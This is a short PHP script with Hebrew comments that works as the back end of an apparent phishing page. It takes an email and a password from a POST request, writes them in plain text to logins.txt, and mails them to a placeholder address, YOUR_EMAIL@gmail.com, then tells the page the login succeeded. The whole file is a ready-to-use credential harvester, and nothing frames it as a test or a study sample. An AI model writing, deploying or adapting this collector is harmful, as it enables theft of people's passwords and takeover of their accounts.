<?php
$data = json_decode(file_get_contents('php://input'), true);
$email = $data['email'];
$password = $data['password'];

// שמור לקובץ טקסט
file_put_contents("logins.txt", "Email: $email | Password: $password\n", FILE_APPEND);

// או שלח אליך למייל:
mail("YOUR_EMAIL@gmail.com", "Login Info", "Email: $email\nPassword: $password");

echo json_encode(["status" => "success"]);
?>
